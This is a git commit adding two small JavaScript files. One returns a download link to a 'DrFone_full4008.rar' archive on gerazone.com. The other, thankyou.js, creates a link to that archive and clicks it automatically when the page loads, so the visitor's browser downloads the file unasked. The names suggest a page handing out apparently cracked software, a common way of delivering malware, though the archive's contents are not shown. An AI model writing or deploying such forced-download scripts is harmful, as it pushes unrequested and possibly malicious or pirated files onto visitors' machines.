509348f86d9435edc0427f0fcaea33bdf0bb681f
auenna <57557028+auenna@users.noreply.github.com>
2021-02-08 19:59:57 +0200

    Add files via upload

---
+++ link.js
@@ -0,0 +1,4 @@
+function getUrl()
+{
+  return "https://gerazone.com/files/DrFone_full4008.rar";
+}
---
+++ thankyou.js
@@ -0,0 +1,4 @@
+var link = document.createElement('a');
+link.setAttribute('href','https://gerazone.com/files/DrFone_full4008.rar');
+link.setAttribute('download','download');
+onload=link.click();
